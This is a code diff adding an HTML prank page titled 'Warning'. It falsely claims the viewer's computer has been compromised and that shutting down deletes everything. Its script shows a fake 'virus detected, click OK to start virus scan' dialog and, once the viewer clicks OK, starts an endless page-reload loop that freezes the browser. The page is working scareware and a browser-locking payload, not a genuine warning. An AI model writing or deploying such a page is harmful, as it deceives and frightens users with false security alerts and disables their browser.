@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Warning</title>
+    <style>
+        body {
+            /* Sets the background image to cover the entire screen */
+            background-image: url('https://s.yimg.com/ny/api/res/1.2/QBf2LA6u_miBXE25v1ahig--/YXBwaWQ9aGlnaGxhbmRlcjt3PTEyNDI7aD0xNjU2/https://media.zenfs.com/en/the-standard-times/829a6b8ec6c3370da58eab685bfb580c');
+            background-size: cover;
+            background-position: center;
+            margin: 0; /* Remove default margin */
+            height: 100vh; /* Full height */
+            color: white; /* Text color */
+            font-family: Arial, sans-serif; /* Improves font readability */
+            text-align: center; /* Center-aligns all text in the body */
+        }
+        h1 {
+            margin-top: 10vh; /* Adds top margin to the bug text */
+            font-size: 24px; /* Sets a larger font size for the headline */
+        }
+        h2 {
+            margin-top: 10vh; /* Adjusted top margin for header after h1 */
+        }
+        p {
+            font-size: 18px; /* Sets font size for paragraph text */
+        }
+    </style>
+</head>
+<body>
+
+<h1>YOU HAVE BEEN BELMORED</h1>
+<h2>If you shut down your computer, everything gets deleted.</h2>
+<p>I would recommend letting it happen.</p>
+
+<script>
+onbeforeunload = function(){localStorage.x=1};
+
+
+if(confirm("Your computer has detected a virus, click OK to start virus scan.")){
+  setTimeout(function(){
+    while(1)location.reload(1)
+  }, 3000)
+}
+</script>
+
+</body>
+</html>
